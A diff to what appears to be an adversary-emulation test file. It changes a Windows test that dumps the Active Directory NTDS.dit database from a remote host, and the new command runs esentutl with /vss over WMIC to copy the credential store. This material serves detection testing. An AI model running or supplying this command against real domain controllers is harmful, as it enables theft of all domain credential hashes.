@@ -142,14 +142,18 @@ atomic_tests:
   auto_generated_guid: d893459f-71f0-484d-9808-ec83b2b64226
   description: |
     This test is intended to be run from a remote workstation with domain admin context.
-    The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
+    The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy (esentutl tool).
   supported_platforms:
   - windows
   input_arguments:
-    drive_letter:
-      description: Drive letter to source VSC (including colon and backslash)
+    source_path:
+      description: File to shadow copy
       type: String
-      default: 'C:\'
+      default: 'c:\windows\ntds\ntds.dit'
+    target_path:
+      description: Target path of the result file
+      type: String
+      default: 'c:\ntds.dit'
     target_host:
       description: IP Address / Hostname you want to target
       type: String
@@ -163,7 +167,7 @@ atomic_tests:
       echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)
   executor:
     command: |
-      wmic /node:#{target_host} shadowcopy call create Volume=#{drive_letter}
+      wmic /node:#{target_host} process call create "cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}"
     name: command_prompt
     elevation_required: true
 
